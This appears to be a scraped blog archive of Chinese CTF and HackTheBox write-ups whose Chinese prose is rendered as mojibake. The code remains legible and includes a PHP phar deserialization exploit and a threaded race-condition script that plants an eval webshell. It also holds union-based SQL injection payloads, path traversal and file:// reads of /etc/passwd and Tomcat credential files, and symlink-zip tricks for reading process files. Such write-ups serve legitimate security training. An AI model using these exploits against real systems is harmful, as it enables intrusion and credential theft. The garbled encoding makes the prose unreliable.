çš„åŠŸèƒ½å°±æ˜¯å®¢æˆ·ç«¯ä¸Šä¼ ä¸€ä¸ªå‹ç¼©åçš„å›¾ç‰‡ï¼ŒæœåŠ¡ç«¯ä¼šè§£å‹ç¼©åå¹¶è¯»å–å›¾ç‰‡è¿”å›å®¢æˆ·ç«¯ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªè½¯é“¾æ¥å‹ç¼©åŒ…ï¼Œæ¥è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶è€Œä¸æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ã€‚åŒæ—¶ç»“åˆ showflag()å‡½æ•°çš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ flag.jpg æ”¾åœ¨ flask åº”ç”¨æ ¹ç›®å½•çš„ flag ç›®å½•ä¸‹ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦åˆ›å»ºä¸€ä¸ªåˆ°/xxx/flask/flag/flag.jpgçš„è½¯é“¾æ¥ï¼Œå³å¯è¯»å– flag.jpg æ–‡ä»¶ã€‚\nåœ¨ linux ä¸­ï¼Œ/proc/self/cwd/ä¼šæŒ‡å‘è¿›ç¨‹çš„å½“å‰ç›®å½•ï¼Œé‚£ä¹ˆåœ¨ä¸çŸ¥é“ flask å·¥ä½œç›®å½•æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨/proc/self/cwd/flag/flag.jpgæ¥è®¿é—® flag.jpg\nå‘½ä»¤ï¼š\nln -s /proc/self/cwd/flag/flag.jpg qwe\rzip -ry qwe.zip qwe\rrepeateræ‰‹åŠ¨ä¸Šä¼ è·å¾—flag\nå¦å¤–ä¸€ç§æ–¹æ³•æ˜¯è·å–flaskè¿è¡Œçš„ç»å¯¹è·¯å¾„ï¼Œåœ¨ linux ä¸­ï¼Œ/proc/self/environæ–‡ä»¶é‡ŒåŒ…å«äº†è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä»ä¸­è·å– flask åº”ç”¨çš„ç»å¯¹è·¯å¾„ï¼Œå†é€šè¿‡ç»å¯¹è·¯å¾„åˆ¶ä½œè½¯é“¾æ¥æ¥è¯»å– flag.jpg (PSï¼šåœ¨æµè§ˆå™¨ä¸­ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥çœ‹åˆ°/proc/self/environçš„å†…å®¹ï¼Œåªéœ€è¦ä¸‹è½½åˆ°æœ¬åœ°ï¼Œç”¨ notepad++æ‰“å¼€å³å¯)\nln -s /proc/self/environ qqq\rzip -ry qqq.zip qqq\rln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www\rzip -ry [www.zip](http://www.zip) www\råˆ©ç”¨å‘½ä»¤æ³¨å…¥è·å–flag å¦ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡å‘½ä»¤æ³¨å…¥æ¥å¤–å¸¦flagï¼Œæˆ‘è¯•äº†è¯•æœ¬åœ°æ˜¯å¯ä»¥çš„\nVPSä¸Šé¢ç›‘å¬æ˜¯å¯ä»¥æ”¶åˆ°çš„ï¼š\nä½†æ˜¯åœ¨BUUå¤ç°çš„æ—¶å€™ï¼Œæˆ‘å¼€äº†å†…ç½‘é¶æœºå´æ²¡æœ‰å¤–å¸¦æˆåŠŸï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œé‚£å°±ä¸æä»–äº†ã€‚\nä¸å¾—ä¸è¯´åˆ©ç”¨æ–‡ä»¶åè¿›è¡Œå‘½ä»¤æ³¨å…¥çš„æ€è·¯æ˜¯å¾ˆç§’çš„\n[CSAWQual 2019]Web_Unagi è€ƒç‚¹ï¼šXXEã€ç¼–ç ç»•è¿‡ã€å¤–å¸¦æ•°æ®\næ‰“å¼€é¢˜ç›®æœ‰ä¸€ä¸ªä¸Šä¼ ç•Œé¢ï¼Œå«æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”hereç»™äº†ä¸€ä¸ªä¾‹å­ï¼š\n\u0026lt;?xml version='1.0'?\u0026gt;\r\u0026lt;users\u0026gt;\r\u0026lt;user\u0026gt;\r\u0026lt;username\u0026gt;alice\u0026lt;/username\u0026gt;\r\u0026lt;password\u0026gt;passwd1\u0026lt;/password\u0026gt;\r\u0026lt;name\u0026gt;Alice\u0026lt;/name\u0026gt;\r\u0026lt;email\u0026gt;alice@fakesite.com\u0026lt;/email\u0026gt; \u0026lt;group\u0026gt;CSAW2019\u0026lt;/group\u0026gt;\r\u0026lt;/user\u0026gt;\r\u0026lt;user\u0026gt;\r\u0026lt;username\u0026gt;bob\u0026lt;/username\u0026gt;\r\u0026lt;password\u0026gt;passwd2\u0026lt;/password\u0026gt;\r\u0026lt;name\u0026gt; Bob\u0026lt;/name\u0026gt;\r\u0026lt;email\u0026gt;bob@fakesite.com\u0026lt;/email\u0026gt; \u0026lt;group\u0026gt;CSAW2019\u0026lt;/group\u0026gt;\r\u0026lt;/user\u0026gt;\r\u0026lt;/users\u0026gt;\ræ„æ€å°±æ˜¯è®©æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªXMlæ–‡ä»¶ï¼Œç”±æ­¤æˆ‘ä»¬æƒ³åˆ°äº†XXEæ¼æ´ã€‚\nä½†æ˜¯æˆ‘ä»¬åœ¨æ„é€ å¤–éƒ¨å®ä½“çš„æ—¶å€™ï¼Œé¡µé¢è¿”å›\u0026quot;WAF blocked uploaded file. Please try again\u0026quot;ã€‚å¯èƒ½æ˜¯æŸäº›è¯è¯­è¢«wafäº†ï¼Œæ—¢ç„¶æœ‰wafæˆ‘ä»¬å°±è¦fuzzã€‚\nå½“æˆ‘ä»¬åœ¨å¤–éƒ¨å®ä½“é‡Œé¢å»æ‰\u0026lt;!ENTITY dy SYSTEM \u0026quot;file:///flag\u0026quot;\u0026gt; çš„æ—¶å€™ï¼Œé¡µé¢å›æ˜¾æ­£å¸¸äº†ï¼Œæˆ‘ä»¬å†æ¥ä¸€ä¸ªä¸ªæµ‹å…³é”®è¯ã€‚\nä¸€ç•ªfuzzä¹‹åï¼Œå‘ç°è¿‡æ»¤äº† SYSTEMã€fileã€ENTITYç­‰å…³é”®è¯ã€‚\nå¸¸è§„çš„XXEç»•è¿‡å…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨é™¤UTF-8çš„ç¼–ç ç»•è¿‡ã€‚\nåˆ©ç”¨Linuxçš„å‘½ä»¤å¯ä»¥æŠŠæ–‡ä»¶è½¬æ¢ä¸ºUTF-16çš„æ ¼å¼ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¸Šä¼ å‘ç°æ²¡æœ‰å‡ºç°WAFçš„ä¿¡æ¯ã€‚\nåªéœ€è¦åœ¨æ ‡ç­¾é‡Œé¢å¼•ç”¨å®ä½“å°±è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°flagåªæ˜¾ç¤ºå‡ºæ¥äº†ä¸€åŠã€‚\nå›æ˜¾ä¸å‡ºæ¥å°±è¦å¤–å¸¦æ•°æ®ï¼Œå¯ä»¥åˆ©ç”¨XMLçš„æŠ¥é”™ä¿¡æ¯ï¼Œä¹Ÿå¯å‘€åˆ©ç”¨ç›²æ‰“çš„å§¿åŠ¿å¤–å¸¦ã€‚\næˆ‘æœ¬æ¥æƒ³å¤–å¸¦VPSçš„ï¼Œç»“è¿‡URLå¡«é”™äº†ç›´æ¥ä¸€ä¸ªæŠ¥é”™å‡ºæ¥äº†ã€‚ã€‚ã€‚\n[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox è€ƒç‚¹ï¼šä»»æ„æ–‡ä»¶æ“ä½œã€pharååºåˆ—åŒ–\nä»»æ„æ–‡ä»¶ä¸‹è½½ å…ˆæ˜¯æ³¨å†Œç™»å½•ï¼Œç„¶åå‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œä¸Šä¼ ä¹‹ååªæœ‰ä¸€ä¸ªä¸‹è½½å’Œåˆ é™¤çš„æŒ‰é’®ï¼Œè”æƒ³åˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚\næŠ“åŒ…ï¼Œæœä¸å…¶ç„¶ï¼š\næŒ¨ä¸ªä¸‹è½½webè·¯å¾„æ–‡ä»¶ï¼Œåœ¨class.phpé‡Œé¢å‘ç°å¾ˆå¤šçš„ç±»ï¼Œè”æƒ³åˆ°ååºåˆ—åŒ–ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ç›´æ¥å‘ç°unserializeçš„æ“ä½œã€‚\nç»“åˆæ–‡ä»¶ä¸Šä¼ ï¼Œæ€è·¯è¿‡æ¸¡åˆ°pharååºåˆ—åŒ–ã€‚\npharååºåˆ—åŒ– æ ¹æ®pharååºåˆ—åŒ–çš„è§¦å‘å‡½æ•°ï¼š\nè§¦å‘ç‚¹åœ¨class.php124è¡Œçš„file_existså‡½æ•°ã€‚\nåœ¨download.phpé‡Œé¢ini_set(\u0026quot;open_basedir\u0026quot;, getcwd() . \u0026quot;:/etc:/tmp\u0026quot;);é™åˆ¶äº†ç›®å½•ï¼Œå½“ä½ ååºåˆ—åŒ–å‘ç”Ÿåœ¨è¿™ä¸ªé¡µé¢çš„æ—¶å€™æ˜¯ä¸èƒ½è¯»å–æ ¹ç›®å½•çš„ï¼Œèƒ½è§¦å‘ä½†æ˜¯è¯»ä¸äº†/flag.txtã€‚\næ‰€ä»¥æ­£ç¡®çš„è§¦å‘ç‚¹åº”è¯¥æ˜¯delete.phpçš„17è¡Œï¼Œè°ƒç”¨$file-\u0026gt;openï¼Œfile_existsè§¦å‘ï¼Œdelete.phpé‡Œé¢å¹¶æ²¡æœ‰é™åˆ¶ç›®å½•æ‰€ä»¥å¯ä»¥ä»»æ„æ–‡ä»¶è¯»ã€‚\nPOPé“¾ User::__destruct:\npublic function __destruct() {\r$this-\u0026gt;db-\u0026gt;close();\r}\rå¯ä»¥åˆ©ç”¨åŒåæ–¹æ³•ï¼š\nFile::closeï¼š\npublic function close() {\rreturn file_get_contents($this-\u0026gt;filename);\r}\rFileList::__call:\npublic function __call($func, $args) {\rarray_push($this-\u0026gt;funcs, $func);\rforeach ($this-\u0026gt;files as $file) {\r$this-\u0026gt;results[$file-\u0026gt;name()][$func] = $file-\u0026gt;$func();\r}\rexp:\n\u0026lt;?php\rclass User {\rpublic $db;\r}\rclass File {\rpublic $filename;\r}\rclass FileList {\rprivate $files;\rprivate $results;\rprivate $funcs;\rpublic function __construct() {\r$file = new File();\r$file-\u0026gt;filename = '/flag.txt';\r$this-\u0026gt;files = array($file);\r$this-\u0026gt;results = array();\r$this-\u0026gt;funcs = array();\r}\r}\r@unlink(\u0026quot;phar.phar\u0026quot;);\r$phar = new Phar(\u0026quot;a.phar\u0026quot;);\r$phar-\u0026gt;startBuffering();\r$phar-\u0026gt;setStub(\u0026quot;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026quot;);\r$o = new User();\r$o-\u0026gt;db = new FileList();\r$phar-\u0026gt;setMetadata($o);\r$phar-\u0026gt;addFromString(\u0026quot;test.txt\u0026quot;, \u0026quot;test\u0026quot;);\r$phar-\u0026gt;stopBuffering();\rç”Ÿæˆpharæ–‡ä»¶ä¹‹åï¼ŒæŠ“åŒ…æ”¹MIMEï¼Œåœ¨delete.phpä½¿ç”¨phar://æ–‡ä»¶åè§¦å‘ï¼Œè¯»å–flagã€‚\n","date":"2020-09-23T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170627.png","permalink":"https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/","title":"BUUOJåˆ·é¢˜è®°å½•(3)"},{"content":"å‰è¨€ ä»ç¬¬ä¸€æ¬¡è€ƒæ ¸åˆ°ç¬¬äºŒæ¬¡è€ƒæ ¸ï¼Œæ˜æ˜¾æ„Ÿè§‰è‡ªå·±å®åŠ›æå‡äº†ä¸€ä¸ªå±‚æ¬¡ï¼Œä¸è¿‡ä»¥åè¦èµ°çš„è·¯è¦è¸©çš„å‘è¿˜å¾ˆå¤šã€‚\nè¿™æ¬¡é¢˜ç›®å¾ˆç»™åŠ›ï¼Œä¸€å…±ä¹é“ï¼Œéš¾çš„ç®€å•çš„éƒ½æœ‰ï¼Œå¹¸è‹¦@jylsecå’Œ@byc_404å­¦é•¿ç»™æˆ‘ä»¬æ­å»ºå¹³å°å’Œå‡ºé¢˜ç›®\nå¯¹CTFçš„å¥—è·¯è¿˜æ˜¯ä¸è¿‡ç†Ÿæ‚‰ï¼Œæˆ–è€…è¯´æ€è·¯è¿˜æ˜¯ä¸å¤Ÿçµæ•ï¼Œå¯¼è‡´æœ‰äº›é¢˜ç›®å¡äº†å¾ˆä¹…æ²¡æ‹¿åˆ°ä¸€è¡€ï¼Œè¿™é‡Œä¹Ÿè†œä¸€ä¸‹Leonå¸ˆå‚…ï¼ˆçœŸçš„æ‰“ä¸è¿‡ï¼‰\nçºªå¿µ æƒ³çœ‹wpï¼Ÿæ€ä¹ˆå¯èƒ½æœ‰wpï¼Œè¿™è¾ˆå­éƒ½ä¸å¯èƒ½æœ‰wpã€‚ä¸Šä¸€å¼ çºªå¿µå›¾ï¼Œçºªå¿µæˆ‘å’Œleonå¸ˆå‚…çº ç¼ ä¸æ¸…çš„çˆ±æƒ…ã€‚\nå…¶ä»–çš„å¸ˆå‚…ä¹Ÿè¦å¤šå¤šåŠ æ²¹å—·~~\n","date":"2020-08-08T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164754.jpeg","permalink":"https://anthem-whisper.github.io/p/2020-x1ct34m-web%E6%96%B9%E5%90%91%E6%9C%80%E7%BB%88%E8%80%83%E6%A0%B8/","title":"2020 X1cT34m WEBæ–¹å‘æœ€ç»ˆè€ƒæ ¸"},{"content":"0dayå¤§æˆ˜ï¼Œï¼Œï¼Œæ‰“ä¸åŠ¨ï¼Œå‘Šè¾\n web_checkin è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«fileåè®®\n\u0026lt;?php\r//PHP 7.0.33 Apache/2.4.25\rerror_reporting(0);\r$sandbox = '/var/www/html/' . md5($_SERVER['REMOTE_ADDR']);\r@mkdir($sandbox);\r@chdir($sandbox);\rhighlight_file(__FILE__);\rif(isset($_GET['content'])) {\r$content = $_GET['content'];\rif(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))\rdie('hacker');\rif(file_exists($content))\rrequire_once($content);\rfile_put_contents($content,'\u0026lt;?php exit();'.$content);\r}\rç›´æ¥fileè¯»å–æ ¹ç›®å½•flag\n?content=file:///flag\rWMCTF{a1sc8591as98c1a96s85c165as1cas7d89}\nMake PHP Great Again è€ƒç‚¹ï¼šsession.upload_progressæ–‡ä»¶åŒ…å«ï¼Œæ¡ä»¶ç«äº‰\nreferer:https://www.freebuf.com/news/202819.html\nexp:\n#coding=utf-8\rimport io\rimport requests\rimport threading\rsessid = 'TGAO'\rdata = {\u0026quot;cmd\u0026quot;:\u0026quot;system('tac /var/www/html/flag.php');\u0026quot;}\rdef write(session):\rwhile True:\rf = io.BytesIO(b'a' *100* 50)\rresp = session.post( 'http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com', data={'PHP_SESSION_UPLOAD_PROGRESS': '\u0026lt;?php eval($_POST[\u0026quot;cmd\u0026quot;]);?\u0026gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )\rdef read(session):\rwhile True:\rresp = session.post('http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com?file=/tmp/sess_'+sessid,data=data)\rif 'tgao.txt' in resp.text:\rprint(resp.text)\revent.clear()\relse:\rprint(\u0026quot;[+++++++++++++]retry\u0026quot;)\rif __name__==\u0026quot;__main__\u0026quot;:\revent=threading.Event()\rwith requests.session() as session:\rfor i in range(1,30):\rthreading.Thread(target=write,args=(session,)).start()\rfor i in range(1,30):\rthreading.Thread(target=read,args=(session,)).start()\revent.set()\rWMCTF{php_s0urc3_1s_om0sh1201}\n","date":"2020-08-03T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100849.jpeg","permalink":"https://anthem-whisper.github.io/p/wmctf2020/","title":"W\u0026MCTF2020"},{"content":"Ezfileinclude è€ƒç‚¹ï¼šUnixæ—¶é—´æˆ³ã€æ–‡ä»¶åŒ…å«ã€ç›®å½•ç©¿è¶Š\nå¼€å±€ä¸€å¼ å›¾ï¼Œå‘ç°æºç  image.php?t=1595664783\u0026amp;f=Z3F5LmpwZw==\nè®¿é—®ä¹‹ï¼Œå›æ˜¾ï¼šWhat's your time? ä»”ç»†çœ‹tå‚æ•°æ˜¯ä¸€ä¸ªunixæ—¶é—´æˆ³ï¼Œç„¶åfæ˜¯base64åçš„æ–‡ä»¶åï¼›\nç›´æ¥å†™è„šæœ¬ï¼Œç›®å½•ç©¿è¶Šè¯»å–/flag\nimport time\rimport requests\rimport base64\rt = int(time.time())\rf = 'gqy.jpg?../../../../../../flag'\rf = base64.b64encode(f.encode()).decode()\rprint(t, f)\rhost = 'http://183.129.189.60:10009/image.php?t={}\u0026amp;f={}'.format(t, f)\rhead = {\r'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)',\r'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'\r}\rr = requests.get(url=host, headers=head)\rprint(r.text)\rSQLi è€ƒç‚¹ï¼šæ— åˆ—åæ³¨å…¥ï¼Œsys.schema_tables_with_full_table_scans\nè®¿é—®è¦æ±‚ä¼ å…¥idå‚æ•°ï¼š\nhttp://183.129.189.60:10004/?id=1;\rè¿”å›wafï¼š\nreturn preg_match(\u0026quot;/;|benchmark|\\^|if|[\\s]|in|case|when|sleep|auto|desc|stat|\\||lock|or|and|\u0026amp;|like|-|`/i\u0026quot;, $id); statæ„å‘³ç€è¿‡æ»¤äº†sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer,mysql.innodb_table_stats\noræ„å‘³ç€è¿‡æ»¤äº†information_schema\nç”±wafæƒ³åˆ°äº†unionæ³¨å…¥ï¼š\n?id=0%27union/**/select/**/1,2,3%23\rArray ( [0] =\u0026gt; 1 [id] =\u0026gt; 1 [1] =\u0026gt; 2 [username] =\u0026gt; 2 [2] =\u0026gt; 3 [password] =\u0026gt; 3 )\rå¯ä»¥çœ‹åˆ°åº“åï¼š\n?id=0%27union/**/select/**/1,database(),3%23\rsqlidb\rä¸Šè¿°bypass infomation_schemaçš„æ–¹æ³•éƒ½è¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡leonå¸ˆå‚…åœ¨ä¸€æ¬¡å¼€å‘å½“ä¸­å‘ç°äº†å¦ä¸€ä¸ªåº“ï¼šsys.schema_tables_with_full_table_scans\n?id=0'/**/union/**/select/**/1,group_concat(object_name),3/**/from/**/sys.schema_tables_with_full_table_scans%23\r#users,flllaaaggg,sys_config\ræ¥ä¸‹æ¥æ˜¯æ— åˆ—åæ³¨å…¥ï¼š\n?id=0'/**/union/**/select/**/1,(select/**/a.2/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flllaaaggg)a/**/limit/**/1,1),3%23\rflag{60325f20416b40b11b6049734bad11cf}\r","date":"2020-07-25T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/dasctf2020.7%E6%9C%88%E8%B5%9B/","title":"DASCTF2020.7æœˆèµ›"},{"content":"Emdee five for life è€ƒç‚¹ï¼špythonæ­£åˆ™ï¼Œrequestæ¨¡å—\næ‰“å¼€é¡µé¢ï¼Œç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œmd5åŠ å¯†åæäº¤ï¼Œå¤ªæ…¢æˆ–è€…é”™äº†å°±ä¼šToo slowï¼š\n\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;title\u0026gt;emdee five for life\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body style=\u0026quot;background-color:powderblue;\u0026quot;\u0026gt;\r\u0026lt;h1 align='center'\u0026gt;MD5 encrypt this string\u0026lt;/h1\u0026gt;\u0026lt;h3 align='center'\u0026gt;LWod6afkxEjJV8KZeLRO\u0026lt;/h3\u0026gt;\u0026lt;center\u0026gt;\u0026lt;form action=\u0026quot;\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt;\r\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;hash\u0026quot; placeholder=\u0026quot;MD5\u0026quot; align='center'\u0026gt;\u0026lt;/input\u0026gt;\r\u0026lt;/br\u0026gt;\r\u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit\u0026quot;\u0026gt;\u0026lt;/input\u0026gt;\r\u0026lt;/form\u0026gt;\u0026lt;/center\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rå½“ç„¶æ˜¯è„šæœ¬ï¼š\n#!/usr/bin/env python3\rimport requests\rimport re\rimport hashlib\rwhile 1:\rhost = \u0026quot;http://docker.hackthebox.eu:32046/\u0026quot;\rreq = requests.session()\rr = req.get(url=host)\r#print(r.text)\rpattern = re.compile(r\u0026quot;\u0026lt;h3 align='center'\u0026gt;(\\S+)\u0026lt;/h3\u0026gt;\u0026quot;)\rh3 = pattern.findall(r.text)\rmd5 = hashlib.md5(h3[0].encode('utf-8')).hexdigest()\r#print(h3[0],md5)\rdata={'hash':md5}\rs = req.post(url=host, data=data)\rif 'Too slow!' in s.text:\rprint('Too slow!')\relse:\rprint(s.text)\rbreak\rç¬¬11è¡Œé‚£é‡Œç”¨äº† (\\S+) å°±ä¼šè¿”å›LWod6afkxEjJV8KZeLRO\nç¬¬äºŒæ¬¡POSTè¿‡å»çš„æ—¶å€™éœ€è¦ç”¨sessionä¸ç„¶å°±ä¼štoo slow\n FreeLancer è€ƒç‚¹ï¼šsqli\næ‰“å¼€é¡µé¢ï¼Œæœ‰ä¸€ä¸ªè¡¨å•\næœ¬æ¥ä»¥ä¸ºæ˜¯XSSï¼Œä½†æ˜¯æ— è®ºæ€ä¹ˆæ ·æäº¤éƒ½æ˜¯500ï¼Œåæ¥çœ‹æºç ï¼Œå‘ç°äº† \u0026lt;!-- \u0026lt;a href=\u0026quot;portfolio.php?id=3\u0026quot;\u0026gt;Portfolio 3\u0026lt;/a\u0026gt; --\u0026gt;\nè®¿é—®å‘ç°sqlæ³¨å…¥ï¼ŒUnionä¸€æŠŠæ¢­å¯ä»¥å‘ç°ï¼š\nè¡¨åï¼športfolio,safeadmin safeadminåˆ—åï¼šid,username,password,created_at\ræ³¨å‡ºæ¥ç”¨æˆ· safeamd å¯†ç  $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K\nä¸è¿‡æ²¡ä»€ä¹ˆç”¨ï¼Œå› ä¸ºæˆ‘ä»¬ç›®çš„æ˜¯è¦getshellï¼Œå…¶å®ä¹Ÿä¸ç”¨getshellï¼Œåªè¦ä½ ç”¨dirbusterçˆ†ç ´å‡ºè¿™ä¸ªæ–‡ä»¶ /var/www/html/administrat/panel.php è¿™ä¸ªæ–‡ä»¶ï¼Œç›´æ¥è¯»å–ä»–å°±å¥½äº†\n","date":"2020-07-25T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181059.jpeg","permalink":"https://anthem-whisper.github.io/p/hackthebox_challenges/","title":"HackTheBox_challenges"},{"content":"ä¿¡æ¯æœé›† æ‰«ä¸€æ³¢ç«¯å£ï¼š\nroot@wh1sper:~/tools/dirsearch# nmap -sT 10.10.10.194\rStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 05:37 PDT\rNmap scan report for 10.10.10.194 (10.10.10.194)\rHost is up (0.27s latency).\rNot shown: 997 closed ports\rPORT STATE SERVICE\r22/tcp open ssh\r80/tcp open http\r8080/tcp open http-proxy\rNmap done: 1 IP address (1 host up) scanned in 639.04 seconds\rroot@wh1sper:~/tools/dirsearch#\rè®¿é—®å‘ç°æ˜¯ä¸ªTomcatçš„é»˜è®¤é¡µé¢ï¼š\nè®¿é—®80ç«¯å£ï¼Œåœ¨é¦–é¡µå‘ç°news.phpï¼Œä¸è¿‡è¿™ä¸ªåŸŸåæ²¡åŠæ³•è®¿é—®ï¼ŒæŠŠä»–ä¿®æ”¹æˆé¶æœºçš„å†…ç½‘ipå³å¯è®¿é—®ï¼š\nç›®å½•ç©¿è¶Š+ä»»æ„æ–‡ä»¶è¯»å– åœ¨ file= å‚æ•°æˆ‘ä»¬å¯ä»¥æƒ³åˆ°ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œè®¿é—® http://10.10.10.194/news.php?file=../../../../etc/passwd å¯ä»¥è·å–åˆ°passwdæ–‡ä»¶ï¼š\nroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\rgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\rsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\rsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\rsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\rmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\rsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\r_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\rtss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\ruuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\rtcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\rlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\rpollinate:x:110:1::/var/cache/pollinate:/bin/false\rsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\rsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\rlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\rtomcat:x:997:997::/opt/tomcat:/bin/false\rmysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false\rash:x:1000:1000:clive:/home/ash:/bin/bash\rå¯ä»¥çœ‹åˆ°è¿™ä¸ªé¶æœºä¸Šé¢å‡ºäº†rootè¿˜ç”¨tomcatã€ashç­‰ç”¨æˆ·ã€‚\nä½†æ˜¯è¿™ä¸ªç›®å½•ç©¿è¶Šåªæ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¹¶ä¸æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼š\nroot@wh1sper:~/tools/dirsearch# curl http://10.10.10.194/news.php?file=../../../../var/www/html/news.php\r\u0026lt;?php\r$file = $_GET['file'];\r$fh = fopen(\u0026quot;files/$file\u0026quot;,\u0026quot;r\u0026quot;);\rwhile ($line = fgets($fh)) {\recho($line);\r}\rfclose($fh);\r?\u0026gt;\rroot@wh1sper:~/tools/dirsearch#\ræˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–ç›´æ¥è¾“å‡ºäº†PHPçš„ä»£ç ï¼Œå¹¶æ²¡æœ‰å»å½“ä½œPHPæ‰§è¡Œï¼Œæ‰€ä»¥æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ã€‚\næˆ‘ä»¬å›åˆ°Tomcaté¡µé¢ï¼Œé¡µé¢æœ€åä¸€è¡Œæç¤ºäº†æˆ‘ä»¬ Users are defined in /etc/tomcat9/tomcat-users.xml ï¼Œå¦‚æœæˆ‘ä»¬èƒ½è¯»å–è¿™ä¸ªæ–‡ä»¶çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨é‡Œé¢çš„ç”¨æˆ·åå¯†ç ç™»å½•tomcatçš„ç®¡ç†åå°äº†\nä½†æ˜¯é¡µé¢æç¤ºçš„/etc/tomcat-users.xmlå¹¶ä¸èƒ½è¯»å–ï¼Œåæ¥ç½‘ä¸ŠæŸ¥äº†ä¸‹tomcaté»˜è®¤å®‰è£…è·¯å¾„å¯èƒ½æ˜¯/usr/share/tomcat9ï¼Œäºæ˜¯å°è¯• /usr/share/tomcat9/etc/tomcat-users.xml ï¼ŒæˆåŠŸè¯»å–åˆ°äº†æ–‡ä»¶ï¼š\nroot@wh1sper:~/HTB/machine/Tabby# curl http://10.10.10.194/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml\r\u0026lt;?xml version=\u0026quot;1.0\u0026quot; 